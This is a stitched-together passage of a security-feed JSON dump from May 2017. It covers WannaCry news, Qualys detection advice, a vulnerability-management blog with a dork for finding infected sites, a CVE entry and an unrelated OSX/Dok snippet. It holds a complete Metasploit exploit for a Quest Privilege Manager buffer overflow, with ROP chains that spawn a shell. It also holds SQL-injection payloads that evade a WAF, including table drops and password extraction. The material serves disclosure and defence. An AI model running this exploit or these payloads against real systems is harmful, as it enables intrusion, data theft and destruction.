[So far, Criminals behind WannaCry Ransomware have received nearly 100 payments from victims, total 15 Bitcoins, equals to USD $26,090.](<https://twitter.com/intent/tweet?text=So+far%2C+Criminals+behind+%23WannaCry+have+received+100+payments+from+victims%2C+total+15+Bitcoins%2C+equals+to+USD+%2426%2C090+http%3A%2F%2Fthehackernews.com%2F2017%2F05%2Fwannacry-ransomware-windows.html>) 





[CLICK TO TWEET__](<https://twitter.com/intent/tweet?text=So+far%2C+Criminals+behind+%23WannaCry+have+received+100+payments+from+victims%2C+total+15+Bitcoins%2C+equals+to+USD+%2426%2C090+http%3A%2F%2Fthehackernews.com%2F2017%2F05%2Fwannacry-ransomware-windows.html>)



 

**Moreover, if you are using Windows 10, you are on the safe side.** 





> \"The exploit code used by WannaCrypt was designed to work only against unpatched Windows 7 and Windows Server 2008 (or earlier OS) systems, so Windows 10 PCs are not affected by this attack,\" Microsoft says.



Once infected, WannaCry locks files on the computers and requires victims to pay $300 in Bitcoins to get back the control of their systems, along with a threat to double the price to $600. 

 

But there's no guarantee of getting your files back even after paying the ransom. 

 





### How is WannaCry Spreading?



Such ransomware infection typically leverages social engineering or spam emails as a primary attack vector, tricking users into downloading and executing a malicious attachment. 

 

WannaCry is also leveraging one such social engineering trick, as FoxIT researchers [uncovered](<https://blog.fox-it.com/2017/05/12/massive-outbreak-of-ransomware-variant-infects-large-amounts-of-computers-around-the-world/>) one variant of the ransomware that is initially distributed via an email containing a link or a PDF file with payload, which if clicked, installs WannaCry on the targeted system. 

 

Once executed, the self-spreading WannaCry ransomware does not infect the targeted computers immediately, as malware reverse engineers found that the dropper first tries to connect the following domain, which was initially unregistered: 





> hxxp://www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com



If the connection to the above-mentioned unregistered domain fails (which is obvious), the dropper proceeds to infect the system with the ransomware that would start encrypting files. 

 

But if the connection is successful, the dropper does not infect the system with the WannaCry ransomware module. 

 

A security researcher, tweeting as [MalwareTech](<https://twitter.com/MalwareTechBlog/status/863187104716685312>), did the same and registered the domain mentioned above, accidentally triggering a \"kill switch\" that can prevent the spread of the WannaCry ransomware, at least for now. 

 

Malware Tech registered this domain by spending just \u00a310, which makes the connection logic successful. 





> \"In other words, blocking the domain with firewall either at ISP or enterprise network level will cause the ransomware to continue spreading and encrypting files,\" Microsoft warned.



If infected, the malware scans the entire internal network and spread like a worm into all unpatched Windows computers with the help of SMB vulnerability. 

 

The SMB vulnerability has been identified as **[EternalBlue](<http://thehackernews.com/2017/04/swift-banking-hacking-tool.html>)**, a collection of hacking tools allegedly created by the NSA and then subsequently dumped by a hacking group calling itself \"[The Shadow Brokers](<http://thehackernews.com/2017/04/nsa-hacking-tools.html>)\" over a month ago. 

 





### Demo of WannaCry Ransomware Infection



 

Meanwhile, [Matthew Hickey](<https://twitter.com/hackerfantastic>), a security expert and co-founder of Hacker House, has provided The Hacker News two video demonstrations, showing packet traces that confirm the use of Windows SMB vulnerability (MS17-010). 





 

And Second one... 

 





Hickey also warned: Since, the WannaCry is a single executable file, so it can also be spread through other regular exploit vectors, such as spear phishing, drive-by-download attack, and malicious torrent files download. 

 





### So Far, Over 114,000 Infections Detected in 99 Countries



[![Protect Against WannaCry](https://1.bp.blogspot.com/-Ih4_J8sN6HA/WRbMeMbz8oI/AAAAAAAAsno/3_kD2_hIGYkw9K-IthRu2_fdE_xSm1UhwCLcB/s1600/wannacry-ransomware-attack.png)](<https://1.bp.blogspot.com/-Ih4_J8sN6HA/WRbMeMbz8oI/AAAAAAAAsno/3_kD2_hIGYkw9K-IthRu2_fdE_xSm1UhwCLcB/s1600/wannacry-ransomware-attack.png>)



WannaCry Ransomware attack has become the largest ransomware infection in history within just a few hours. 





 * A total of 16 U.K. organizations has been affected by the ongoing attack, including the National Health Service (NHS), which was forced to reject patients, cancel operations, and reschedule appointments due to malware infection.

 * WannaCry also targeted Spanish telecom giant Telef\u00f3nica infecting by some of its computers on an internal network, but did not affect clients or services.

 * Other victims of the attack include Portugal Telecom and Russia\u2019s MegaFon.

 * Delivery company FedEx was also a victim.

 * Users from Japan, Turkey, and the Philippines were also affected.



 





### 7 Easy Steps to Protect Yourself



Currently, there is no WannaCry decryption tool or any other solution available, so users are strongly advised to follow prevention measures in order to protect themselves.



 * **Keep your system Up-to-date:** First of all, if you are using supported, but older versions of Windows operating system, keep your system up to date, or simply upgrade your system to Windows 10.

 * **Using Unsupported Windows OS?** If you are using unsupported versions of Windows, including Windows XP, Vista, Server 2003 or 2008, apply the [emergency patch](<http://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598>) released by Microsoft today.

 * **Enable Firewall: **Enable firewall, and if it is already there, modify your firewall configurations to block access to SMB ports over the network or the Internet. The protocol operates on TCP ports 137, 139, and 445, and over UDP ports 137 and 138.

 * **Disable SMB: **Follow [steps](<https://support.microsoft.com/en-in/help/2696547/how-to-enable-and-disable-smbv1,-smbv2,-and-smbv3-in-windows-vista,-windows-server-2008,-windows-7,-windows-server-2008-r2,-windows-8,-and-windows-server-2012>) described by Microsoft to disable Server Message Block (SMB).

 * **Keep your Antivirus software up-to-date:** Virus definitions have already been updated to protect against this latest threat.

 * **Backup Regularly:** To always have a tight grip on all your important files and documents, keep a good backup routine in place that makes their copies to an external storage device that is not always connected to your PC.

 * **Beware of Phishing: **Always be suspicious of uninvited documents sent an email and never click on links inside those documents unless verifying the source.

", "edition": 9, "reporter": "Mohit Kumar", "published": "2017-05-12T21:48:00", "title": "Protect Against WannaCry: Microsoft Issues Patch for Unsupported Windows (XP, Vista, 8,...)", "type": "thn", "objectVersion": "1.2", "bulletinFamily": "info", "cvelist": [], "modified": "2017-05-13T21:44:39", "id": "THN:2E41FB220110EDE857D6C4EAC325843A", "href": "http://thehackernews.com/2017/05/wannacry-ransomware-windows.html", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "bulletinFamily", "hash": "caf9b6b99962bf5c2264824231d7a40c"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "0964ad5d999f097b5662b62491698269"}, {"key": "href", "hash": "2e41fb220110ede857d6c4eac325843a"}, {"key": "modified", "hash": "30d6343e2fcee60044037c67fc5ed016"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "53d1cd867df2a15be34f158cdd6bfc01"}, {"key": "references", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "reporter", "hash": "1ad21668802646af6d2137bdfd3caeb1"}, {"key": "title", "hash": "8784e79ed2ce7fd9e8b78027086044bf"}, {"key": "type", "hash": "05b17d439d33369be9ea6552b64028b7"}], "hash": "94063c0e7c782fff93197afb5b21cf44ae28fea6ab2a36e3e877e943e35efab3"}], "qualysblog": [{"lastseen": "2017-05-13T02:44:18", "references": [], "description": "In what may be the first public weaponizing of April's Shadow Brokers dump of NSA exploits, a ransomware attack has crippled IT systems globally and disrupted operations at major organizations, including patient services at UK hospitals.



About [80,000 infections](<https://intel.malwaretech.com/botnet/wcrypt/?t=1m&bid=all>) have been detected in [about 100 countries](<https://blog.avast.com/ransomware-that-infected-telefonica-and-nhs-hospitals-is-spreading-aggressively-with-over-50000-attacks-so-far-today>), and the attack, which uses the WannaCry (WanaCrypt0r 2.0) ransomware, continues to spread.



The rapid weaponizing of newly disclosed nation state exploits for criminal purposes and, in this case, monetary gain, places new burdens on enterprises' security organizations. They now must deal with destructive and fast-moving cyber attacks such as this one, which requires putting in place systems, tools, and processes to quickly identify, prioritize, and remediate these attacks.



It took just 28 days from the original dump of the [Shadow Brokers dump of NSA exploits](<https://arstechnica.com/security/2017/04/nsa-leaking-shadow-brokers-just-dumped-its-most-damaging-release-yet/>) targeting [newly disclosed vulnerabilities (MS17-010)](<https://blog.qualys.com/securitylabs/2017/04/15/the-shadow-brokers-release-zero-day-exploit-tools>) to yield a fully operational and crippling cyber attack.



Enterprises with vulnerability management programs that scan less frequently, such as those performing only monthly scans, providing no coverage of remote user machines or lacking threat-prioritized remediation processes, can be still at risk.



Also in danger are enterprises with \"end of life\" (EOL) systems, those whose vendors no longer support them and whose vulnerabilities thus remain unpatched. While these systems can not be patched, enterprises should consider disabling vulnerable services if they're not being used.



### Identification and Tracking of Remediation



WannaCry exploits the ETERNALBLUE vulnerability. Qualys' Vulnerability Team analyzed the Shadow Brokers dump and [made this analysis](<https://threatprotect.qualys.com/2017/04/24/eternalblue-smb-exploit/>) available to customers subscribed to the Qualys ThreatPROTECT service (see image below). Threat prioritization coupled with continuous vulnerability management across on-premises systems, cloud instances, and remote user endpoints provides full visibility of impacted assets for precise and prompt remediation.



![](https://blog.qualys.com/wp-content/uploads/2017/05/image1-660x340.png)



Enterprises running Qualys using scanners or Cloud Agents can verify the presence of these vulnerabilities through QIDs 91345 and 91360 (ETERNALBLUE) as well as 91361, 91359, 91357, 53007, 87284 and focus on infected assets with [ThreatPROTECT](<https://www.qualys.com/suite/threatprotect/>) to prioritize remediation. Customers can also track the remediation progress over time across their global on-premises, cloud, and user endpoints with an AssetView trend widget, as shown below.



![](https://blog.qualys.com/wp-content/uploads/2017/05/image2.png)



### Mitigations for WannaCry



 * Apply patches for [MS17-010](<https://technet.microsoft.com/en-us/library/security/ms17-010.aspx>) (ETERNALBLUE and DOUBLEPULSAR)

 * Create a named mutex \"MsWinZonesCacheCounterMutexA\" (ref:<https://twitter.com/gN3mes1s/status/863149075159543808>)

 * Filter all SMB (TCP/445), NetBIOS (TCP/139), and RDP (TCP/3389)



### Detecting Compromised Assets



Qualys has also added QID 1029 WannaCrypt Ransomware Detected to help you identify assets that have already been infected with this malware, which can be leveraged in an AssetView widget. Continuous Monitoring can be used to send a notification if any system is found to be compromised.



To start detecting and protecting against critical vulnerabilities, sign up for a [Qualys Suite trial](<https://www.qualys.com/forms/trials/suite/>), which includes all features described in this article.", "edition": 2, "reporter": "Jimmy Graham", "published": "2017-05-13T00:29:19", "title": "How to Rapidly Identify Assets at Risk to WannaCry Ransomware and ETERNALBLUE Exploit", "type": "qualysblog", "objectVersion": "1.2", "bulletinFamily": "blog", "cvelist": [], "modified": "2017-05-13T00:29:19", "id": "QUALYSBLOG:9A21B2F2CDFD107DF5A18012922E8783", "href": "https://blog.qualys.com/securitylabs/2017/05/12/how-to-rapidly-identify-assets-at-risk-to-wannacry-ransomware-and-eternalblue-exploit", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "bulletinFamily", "hash": "126ac9f6149081eb0e97c2e939eaad52"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "0c7cdc7afcc5388ce958e901b3bd0006"}, {"key": "href", "hash": "992929081ec88cdc8729371ae0bf9c20"}, {"key": "modified", "hash": "8307fe9a232a42a6f8e8b5b7c9612a04"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "8307fe9a232a42a6f8e8b5b7c9612a04"}, {"key": "references", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "reporter", "hash": "84fef881ea044a0b7609e120459b45fc"}, {"key": "title", "hash": "bc63419591378ac9c61bbed59af8b355"}, {"key": "type", "hash": "426a4a70f4c572c82a492ae3be26df87"}], "hash": "ac76ea5d294db51df336d3a2af8b7a79bf7d4c04f27e5c59963d7256419728c4"}], "packetstorm": [{"lastseen": "2017-05-13T17:26:57", "references": [], "description": "", "edition": 1, "reporter": "m0t", "published": "2017-05-13T00:00:00", "title": "Quest Privilege Manager pmmasterd Buffer Overflow", "type": "packetstorm", "objectVersion": "1.2", "bulletinFamily": "exploit", "cvelist": ["CVE-2017-6554", "CVE-2017-6553"], "modified": "2017-05-13T00:00:00", "id": "PACKETSTORM:142492", "href": "https://packetstormsecurity.com/files/142492/Quest-Privilege-Manager-pmmasterd-Buffer-Overflow.html", "sourceData": "`## 

# This module requires Metasploit: http://metasploit.com/download 

# Current source: https://github.com/rapid7/metasploit-framework 

## 

 

class MetasploitModule < Msf::Exploit::Remote 

Rank = NormalRanking 

 

include Exploit::Remote::Tcp 

 

def initialize(info = {}) 

super(update_info(info, 

'Name' => 'Quest Privilege Manager pmmasterd Buffer Overflow', 

'Description' => %q{ 

This modules exploits a buffer overflow in the Quest Privilege Manager, 

a software used to integrate Active Directory with Linux and Unix 

systems. The vulnerability exists in the pmmasterd daemon, and can only 

triggered when the host has been configured as a policy server ( 

Privilege Manager for Unix or Quest Sudo Plugin). A buffer overflow 

condition exists when handling requests of type ACT_ALERT_EVENT, where 

the size of a memcpy can be controlled by the attacker. This module 

only works against version < 6.0.0-27. Versions up to 6.0.0-50 are also 

vulnerable, but not supported by this module (a stack cookie bypass is 

required). NOTE: To use this module it is required to be able to bind a 

privileged port ( <=1024 ) as the server refuses connections coming 

from unprivileged ports, which in most situations means that root 

privileges are required. 

}, 

'Author' => 

[ 

'm0t' 

], 

'References' => 

[ 

['CVE', '2017-6553'], 

['URL', 'https://0xdeadface.wordpress.com/2017/04/07/multiple-vulnerabilities-in-quest-privilege-manager-6-0-0-xx-cve-2017-6553-cve-2017-6554/'] 

], 

'Payload' => 

{ 

'Compat' => 

{ 

'PayloadType' => 'cmd', 

'RequiredCmd' => 'generic python perl ruby openssl bash-tcp' 

} 

}, 

'Arch' => ARCH_CMD, 

'Platform' => 'unix', 

'Targets' => 

[ 

['Quest Privilege Manager pmmasterd 6.0.0-27 x64', 

{ 

exploit: :exploit_x64, 

check: :check_x64 

} 

], 

['Quest Privilege Manager pmmasterd 6.0.0-27 x86', 

{ 

exploit: :exploit_x86, 

check: :check_x86 

} 

] 

], 

'Privileged' => true, 

'DisclosureDate' => 'Apr 09 2017', 

'DefaultTarget' => 0 

) 

) 

 

register_options( 

[ 

Opt::RPORT(12345), 

Opt::CPORT(rand(1024)) 

] 

) 

end 

 

# definitely not stealthy! sends a crashing request, if the socket dies, or 

# the output is partial it assumes the target has crashed. Although the 

# daemon spawns a new process for each connection, the segfault will appear 

# on syslog 

def check 

unless respond_to?(target[:check], true) 

fail_with(Failure::NoTarget, \"Invalid target specified\") 

end 

 

send(target[:check]) 

end 

 

def exploit 

unless respond_to?(target[:exploit], true) 

fail_with(Failure::NoTarget, \"Invalid target specified\") 

end 

 

request = send(target[:exploit]) 

 

connect 

print_status(\"Sending trigger\") 

sock.put(request) 

sock.get_once 

print_status(\"Sending payload\") 

sock.put(payload.encoded) 

disconnect 

end 

 

# server should crash after parsing the packet, partial output is returned 

def check_x64 

head = [ 0x26c ].pack(\"N\") 

head << [ 0x700 ].pack(\"N\") 

head << [ 0x700 ].pack(\"N\") 

head << \"\\x00\" * 68 

 

body = \"PingE4.6 .0.0.27\" 

body << rand_text_alpha(3000) 

 

request = head + body 

 

connect 

print_status(\"Sending trigger\") 

sock.put(request) 

res = sock.timed_read(1024, 1) 

if res.match? \"Pong4$\" 

return Exploit::CheckCode::Appears 

else 

return Exploit::CheckCode::Unknown 

end 

end 

 

# server should crash while parsing the packet, with no output 

def check_x86 

head = [ 0x26c ].pack(\"N\") 

head << [ 0x700 ].pack(\"N\") 

head << [ 0x700 ].pack(\"N\") 

head << \"\\x00\" * 68 

 

body = rand_text_alpha(3000) 

 

request = head + body 

 

connect 

print_status(\"Sending trigger\") 

sock.put(request) 

begin 

sock.timed_read(1024, 1) 

return Exploit::CheckCode::Unknown 

rescue ::Exception 

return Exploit::CheckCode::Appears 

end 

end 

 

def exploit_x64 

head = [ 0x26c ].pack(\"N\") 

head << [ 0x700 ].pack(\"N\") 

head << [ 0x700 ].pack(\"N\") 

head << \"\\x00\" * 68 

 

# rop chain for pmmasterd 6.0.0.27 (which is compiled without -fPIE) 

ropchain = [ 

0x408f88, # pop rdi, ret 

0x4FA215, # /bin/sh 

0x40a99e, # pop rsi ; ret 

0, # argv @rsi 

0x40c1a0, # pop rax, ret 

0, # envp @rax 

0x48c751, # mov rdx, rax ; pop rbx ; mov rax, rdx ; ret 

0xcacc013, # padding 

0x408a98, # execve, 

0 

].pack(\"Q*\") 

 

body = \"PingE4.6 .0.0.27\" # this works if encryption is set to AES, which is default, changing E4 to E2 might make it work with DES 

body << rand_text_alpha(1600) 

body << ropchain 

body << rand_text_alpha(0x700 - body.size) 

 

head + body 

end 

 

def exploit_x86 

head = [ 0x26c ].pack(\"N\") 

head << [ 0x108 ].pack(\"N\") 

head << [ 0xcc ].pack(\"N\") 

head << \"\\x00\" * 68 

 

# rop chain for pmmasterd 6.0.0.27 (which is compiled without -fPIE) 

ropchain = [ 

0x8093262, # ret 

0x73, # cs reg 

0x804AE2C, # execve, 

0xcacc013, # padding 

0x8136CF0, # /bin/sh 

0, 

0 

].pack(\"V*\") 

 

pivotback = 0x08141223 # sub esp, ebx ; retf 

writable = 0x81766f8 # writable loc 

 

body = \"PingE4.6 .0.0.27\" # this works if encryption is set to AES, which is default, changing E4 to E2 might make it work with DES 

body << rand_text_alpha(104) 

body << ropchain 

body << rand_text_alpha(0xb4 - body.size) 

body << [0x50].pack(\"V\") 

body << rand_text_alpha(0xc4 - body.size) 

body << [pivotback].pack(\"V\") 

body << [writable].pack(\"V\") 

body << rand_text_alpha(0x108 - body.size) 

 

head + body 

end 

end 

`

", "cvss": {"score": 10.0, "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"}, "hashmap": [{"key": "bulletinFamily", "hash": "708697c63f7eb369319c6523380bdf7a"}, {"key": "cvelist", "hash": "e6c9fb2831497d5ce664d654af5672d1"}, {"key": "cvss", "hash": "2bdabeb49c44761f9565717ab0e38165"}, {"key": "description", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "href", "hash": "e49a67c61787767911937ac2cf8ba53a"}, {"key": "modified", "hash": "7087ee65c2383d964726bbf1465730fc"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "7087ee65c2383d964726bbf1465730fc"}, {"key": "references", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "reporter", "hash": "3003e71f55e86e1d250649f9115f6f47"}, {"key": "sourceData", "hash": "2b8926e06129bcf698813ef8013bde77"}, {"key": "sourceHref", "hash": "e711f0b5eccab3f62499f91cb4a6a42b"}, {"key": "title", "hash": "7f5f5b413734e869ec9b2d56844c2bb5"}, {"key": "type", "hash": "6466ca3735f647eeaed965d9e71bd35d"}], "sourceHref": "https://packetstormsecurity.com/files/download/142492/quest_pmmasterd_bof.rb.txt", "hash": "f37aa250463004a6505ddba8ecb52cc372691cedc64f8bf5e86ad651325caee4"}], "avleonov": [{"lastseen": "2017-05-13T13:01:47", "references": [], "description": "Nearly all mainstream media wrote today about massive ransomware attacks around the world: 16 medical institutions in UK, strong rumours that huge companies in Russia, and even Russian Ministry of Internal Affairs suffered a damage.



At this moment [Kaspersky recorded](<https://securelist.com/blog/incidents/78351/wannacry-ransomware-used-in-widespread-attacks-all-over-the-world/>) more than 45,000 attacks in 74 countries around the world, but mostly in Russia. During the attack WannaCry malware encrypts data with the extension \u201c.WCRY\u201d added to the filename - that's why it is called this way.



![WannaCry CryptoLocker](https://avleonov.com/wp-content/uploads/2017/05/wannacry.png)



What I like in this WannaCry story, that it's actually all about Vulnerability Management.



WannaCry uses EternalBlue exploit to attack computers running the Microsoft Windows operating system.



### Maybe this exploit uses some unknown 0day vulnerability?



No, patch [MS17-010](<https://technet.microsoft.com/en-us/library/security/ms17-010.aspx>) for this vulnerability was published 14.03.2017, month ago. It was marked as critical.



### Maybe this vulnerability was hard to detect using vulnerability scanners?



No, here you can see Nessus [local check plugin](<https://vulners.com/nessus/SMB_NT_MS17-010.NASL>) and [remote uncredentialed check plugin](<https://vulners.com/nessus/MS17-010.NASL>). Don't have budget for Nessus Professional? Here are similar vulnerability checks for [free and open source OpenVAS](<https://avleonov.com/2017/04/10/installing-openvas-9-from-the-sources/>): [local check](<https://vulners.com/openvas/OPENVAS:810810>) and [remote uncredentialed check](<https://vulners.com/openvas/OPENVAS:810676>).



### Maybe this vulnerability was hard to filter because of some weird CVSS vector and score?



No, Access Vector: Network, CVSS Base Score: 9.8. It was hard to miss this vulnerability in scan results.



### Maybe this vulnerabilities were not discussed publicly?



No. Almost all media wrote about the [NSA exploits Leaked By Shadow Brokers](<https://vulners.com/search?query=EternalBlue%20published:\\[2017-04-13%20TO%202017-04-15\\]>). It was breaking news.



![EternalBlue exploit](https://avleonov.com/wp-content/uploads/2017/05/EternalBlue.png)



And it was obvious that very soon this exploits will be actively used by ordinary criminals. It was just a matter of time.



### So, what can we tell about organisations that were massively affected by WannaCry?



They probably have some problems with Patch Management process. For some reason, MS17-010 patch was not installed automatically using standard Microsoft tools.



They probably have problems with Vulnerability Management process. For some reason, Security Team have not detected the fact that this critical vulnerability was not fixed for a long time, and did not force patch process.



It's also important if there were backups (universal solution against CryptoLockers) and updated antivirus knowledge bases (definitely not a panacea, but still better than nothing).



In conclusion, if you are curious how the result of attack looks like, you can use this simple Google dork: [\"WNCRY\" intitle:\"index of\"](<https://www.google.ru/search?q=%22WNCRY%22+intitle%3A%22index+of%22>). You will get plenty of website, hosted on vulnerable Windows machines.



![WannaCry Google dork](https://avleonov.com/wp-content/uploads/2017/05/WannaCryGoogle.png)



WannaCry was able to encrypt files in site directory, including index.html, so you can now see file structure of the site. It also created files @Please_Read_Me@.txt, @WanaDecryptor@.exe or @WanaDecryptor@.exe.lnk in affected folders.



![WannaCry encrypted site](https://avleonov.com/wp-content/uploads/2017/05/encrypted_site.png)



![](http://feeds.feedburner.com/~r/avleonov/~4/eWe2j32_ye4)", "edition": 4, "reporter": "Alexander Leonov", "published": "2017-05-12T23:01:38", "title": "WannaCry about Vulnerability Management", "type": "avleonov", "objectVersion": "1.2", "bulletinFamily": "blog", "cvelist": [], "modified": "2017-05-12T23:01:38", "id": "AVLEONOV:586CF885CE8768A750389164D1B93703", "href": "http://feedproxy.google.com/~r/avleonov/~3/eWe2j32_ye4/", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "bulletinFamily", "hash": "126ac9f6149081eb0e97c2e939eaad52"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "6eccf984ca078e46257e1ac0f3fb740b"}, {"key": "href", "hash": "e061ac1097083fecf4a0d917523d6b74"}, {"key": "modified", "hash": "41b30216f150c7ee3f5c86f2b87125ec"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "41b30216f150c7ee3f5c86f2b87125ec"}, {"key": "references", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "reporter", "hash": "5f654286e5d51f6727b627a0bf616fdf"}, {"key": "title", "hash": "d2b61505148dad32e9a8c24061a9d50c"}, {"key": "type", "hash": "d8cbe6c2b99ea50223a4b9b09d78e9ed"}], "hash": "89c49f5475424372aeaf46e673f99ed89532f53d4f01c6fbbb5ee50892fcc074"}], "d0znpp": [{"lastseen": "2017-05-13T17:01:20", "references": [], "description": "Before we start, [libinjection](<https://github.com/client9/libinjection>) is a very popular open-source project (<https://github.com/client9/libinjection>) created by [Nick Galbreath](<https://github.com/client9/libinjection>) from Signal Sciences. 

A lot of WAFs and NGWAFs use this library instead of regular expressions because of performance. For example, mod_security since version 2.7.4 supports libinjection by two operators in the SecRule definition: detectSQLi (since 2.7.4) and detectXSS (since 2.8.0).



Technically libinjection is a C-based parser based on the tokenizers for different syntax. 

SQL syntax and HTML syntax are supported now.



But sometimes libinjection is even worse than regular expressions. Let me tell you why.



**A. Unknown token for the libinjection tokenizer. 

**A.1. Function token. It\u2019s easiest way to find unknown token. Authors tried to list all the possible SQL functions, but it\u2019s impossible because of the custom functions (stored procedures, triggers, dynamic functions, etc). 

The second reason why it was a wrong decision to list all the SQL functions in the tokenizer is many different SQL functions built-in in various SQL engines such as MariaDB, MySQL, SQLite, PostgreSQL, etc.



A simple example here is:

 

 

 **?id=\u2018-sqlite_version() UNION SELECT password FROM users- -**



**B. Unknown context for the libinjection parser. 

**B.1. Brackets context. 

If an attacker wants to do DoS and turn down your database through SQL injection, he should run a huge query like this:

 

 

 **?id=sleep(9999)**



But this attempt will be detected and blocked as attack. 

However this one will not:

 

 

 **?id=)-sleep(9999**



Just because libinjection doesn\u2019t know brackets contexts.



The same situation for the file writing in MySQL:

 

 

 **?id=1337 INTO OUTFILE \u2018xxx\u2019--**



will be detected. 

But this one :

 

 

 **?id=1337) INTO OUTFILE \u2018xxx\u2019--**



will not be detected because of the context.



A lot of fun can be obtained through stacked (batch) queries:

 

 

 **?id=123;DROP TABLE users--**



will be detected and blocked, but this one:

 

 

 **?id=123);DROP TABLE users--**



will not be blocked and you will miss your users table\u2026



Simple data extraction payload could looks like:

 

 

 **?id=) OR (SELECT password FROM users ...**



B.2. Comments context. Injection inside the comment of SQL query.

 

 

 ***/UNION SELECT password FROM users--**



It\u2019s not so rare to find the injection inside comments area in SQL query. libinjection can\u2019t detect anything there just because doesn\u2019t support this kind of context inside the SQL parser.



As seen in this article, it is not so easy to protect Web applications even from such well understood attacks as SQL injections. Even very popular and modern libraries can be easily bypassed.



![](https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=1e2513453c0f)", "edition": 1, "reporter": "Ivan Novikov", "published": "2017-05-12T18:55:21", "title": "How to bypass libinjection in many WAF/NGWAF", "type": "d0znpp", "objectVersion": "1.2", "bulletinFamily": "blog", "cvelist": [], "modified": "2017-05-12T22:35:44", "id": "D0ZNPP:989C3FB6BBF8BCB1877FAC2053160F16", "href": "https://medium.com/@d0znpp/how-to-bypass-libinjection-in-many-waf-ngwaf-1e2513453c0f?source=rss-952c3fe8c7c7------2", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "bulletinFamily", "hash": "126ac9f6149081eb0e97c2e939eaad52"}, {"key": "cvelist", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "65f0a99fbbec1a1d4f214f7b6a394f8a"}, {"key": "href", "hash": "01c920446f43eb9fec898f51b878386f"}, {"key": "modified", "hash": "4bc14bb5953333601734ef201e3996fa"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "9c1b5111027d0a74dbcccc5f9b3b99e2"}, {"key": "references", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "reporter", "hash": "16a2229c90b53a365cbc8cbc585dc421"}, {"key": "title", "hash": "95079308d37a5ed701a1186e98b91e64"}, {"key": "type", "hash": "5d612b796768c61d594a88f8b25918c9"}], "hash": "88acc9c8c3cf5fd18b4a6526ea480dfdb7aec4ef8ae15de03fef50da0e5b0ad5"}], "cve": [{"lastseen": "2017-05-13T07:46:45", "references": ["http://www.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.10.4", "http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=654b404f2a222f918af9b0cd18ad469d0c941a8e", "https://github.com/torvalds/linux/commit/654b404f2a222f918af9b0cd18ad469d0c941a8e"], "description": "The edge_bulk_in_callback function in drivers/usb/serial/io_ti.c in the Linux kernel before 4.10.4 allows local users to obtain sensitive information (in the dmesg ringbuffer and syslog) from uninitialized kernel memory by using a crafted USB device (posing as an io_ti USB serial device) to trigger an integer underflow.", "edition": 1, "reporter": "NVD", "published": "2017-05-12T17:29:00", "title": "CVE-2017-8924", "type": "cve", "objectVersion": "1.2", "assessment": {"system": "", "name": "", "href": ""}, "bulletinFamily": "NVD", "cvelist": ["CVE-2017-8924"], "scanner": [], "modified": "2017-05-12T17:29:00", "cpe": [], "id": "CVE-2017-8924", "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-8924", "cvss": {"score": 0.0, "vector": "NONE"}, "hashmap": [{"key": "assessment", "hash": "6d3f4796275bb54c21a33b82f399cc6d"}, {"key": "bulletinFamily", "hash": "601892ece72be3be2f57266ca2354792"}, {"key": "cpe", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "cvelist", "hash": "d3bd333058bd36ecef84171c4644d9db"}, {"key": "cvss", "hash": "8cd4821cb504d25572038ed182587d85"}, {"key": "description", "hash": "43c00eb636a67b2b6e411e668518f9e6"}, {"key": "href", "hash": "7ceb591d2ed3eec6c6a34cb3da7ee16a"}, {"key": "modified", "hash": "8961ae1d2a3f7c9b8707083149486a5a"}, {"key": "objectVersion", "hash": "56765472680401499c79732468ba4340"}, {"key": "published", "hash": "8961ae1d2a3f7c9b8707083149486a5a"}, {"key": "references", "hash": "686f4a9c8cb10d57c7708fed71e0eb4b"}, {"key": "reporter", "hash": "601892ece72be3be2f57266ca2354792"}, {"key": "scanner", "hash": "d41d8cd98f00b204e9800998ecf8427e"}, {"key": "title", "hash": "74ef7c63a2474ab18ff885174231c7b5"}, {"key": "type", "hash": "1716b5fcbb7121af74efdc153d0166c5"}], "hash": "97a14fd71e7eaf1128da0fe9b3884ab86b50c029a4de89214a8e1c37f11aa37c"}]}}|||

Apple revoked a legitimate developer certificate used by hackers behind malware dubbed OSX/Dok, which was able to eavesdrop on secure HTTPS traffic of infected systems. On Sunday, Apple also rolled out an update to its XProtect built-in antimalware software to fend off existing and upcoming OSX/Dok-type attacks.